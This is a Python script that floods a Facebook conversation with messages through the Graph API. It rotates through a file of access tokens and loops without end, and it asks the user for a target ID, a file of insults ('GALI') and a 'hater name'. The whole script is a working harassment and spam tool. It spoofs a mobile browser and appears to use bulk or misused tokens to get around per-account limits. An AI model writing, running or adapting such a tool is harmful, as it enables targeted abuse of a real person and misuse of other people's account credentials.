import requests
import time
import random
import os
from colorama import init, Fore

init(autoreset=True)

def approval():
    os.system('clear')
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = "-".join(uuid)   

def send_messages(tokens_file, target_id, messages_file, haters_name, speed):
    with open(messages_file, "r") as file:
        messages = file.readlines()
    with open(tokens_file, "r") as file:
        tokens = file.readlines()

    headers = {
        "Connection": "keep-alive",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": ("Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36"),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9,fr;q=0.8",
        "Referer": "www.google.com",
    }

    logos = [
        r'''
  ____  _____       _       ______   _____  ____    ____     ______   
|_   \|_   _|     / \     |_   _ `.|_   _||_   \  /   _|  .' ___  |  
  |   \ | |      / _ \      | | `. \ | |    |   \/   |   / .'   \_|  
  | |\ \| |     / ___ \     | |  | | | |    | |\  /| |   | |    ___  
 _| |_\   |_  _/ /   \ \_  _| |_.' /_| |_  _| |_\/_| |_  \ `.___]  | 
|_____|\____||____| |____||______.'|_____||_____||_____|  `._____.'                                                
'''
    ]

    while True:
        for message_index, message in enumerate(messages):
            token_index = message_index % len(tokens)
            access_token = tokens[token_index].strip()
            full_message = f"{haters_name} {message.strip()}"

            url = f"https://graph.facebook.com/v17.0/t_{target_id}"
            parameters = {"access_token": access_token, "message": full_message}
            try:
                response = requests.post(url, json=parameters, headers=headers)
                response.raise_for_status()
                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                current_logo = random.choice(logos)
                print(Fore.GREEN + current_logo)
                print(Fore.WHITE + f"[+]  ✪✭══════════•『 \033[1;32m \033[1;91m\033[1;41m\032[1;32m𝗬𝗢𝗨𝗥 𝗦𝗠𝗦 𝗦𝗘𝗡𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗨𝗙𝗨𝗟 🎉 \033[;0m\033[1;91m\033[1;92m\033[38;5;46m』•══════════✭✪ {message_index + 1} S3NT TO C0NV0 {target_id} W1TH TOK3N {token_index + 1}: {full_message} at {current_time}")
            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"[x] F91L3D TO S3ND M3SS3G3  {message_index + 1} \033[1;37mT0 C0NV0 {target_id} W1TH TOK3N {token_index + 1}: {full_message} - Error: {e}")

            time.sleep(speed)
        print(Fore.CYAN + "\n[+] All messages sent. Restarting the process...\n")

def main():
    approval()
    
    print(Fore.MAGENTA + " \033[1;37m 🕊️❣️<<•B──R───O──K──E──N──💫─N───A───D───I───M•>>🕊️❣️NAM TO YAD HOGA")
    print(Fore.CYAN + "\033[1;37m<<══════════════════════════════════════════════════════════════════>>")
    # Get file paths and other inputs from the user
    tokens_file = input(Fore.GREEN + "[+] ENTER-THE-TOKENS-FILE=>> ").strip()
    target_id = input(Fore.YELLOW + "[+] ENTER-THE-TARGET-ID=>> ").strip()
    messages_file = input(Fore.YELLOW + "[+] ENTER-----GALI-FILE=>> ").strip()
    haters_name = input(Fore.YELLOW + "[+] ENTER-HATER-NAME=>> ").strip()
    speed = float(input(Fore.GREEN + "[+] ENTER THE SPEED (IN SECONDS) BETWEEN MESSAGES=>> ").strip())

    # Start sending messages
    send_messages(tokens_file, target_id, messages_file, haters_name, speed)

if __name__ == "__main__":
    main()
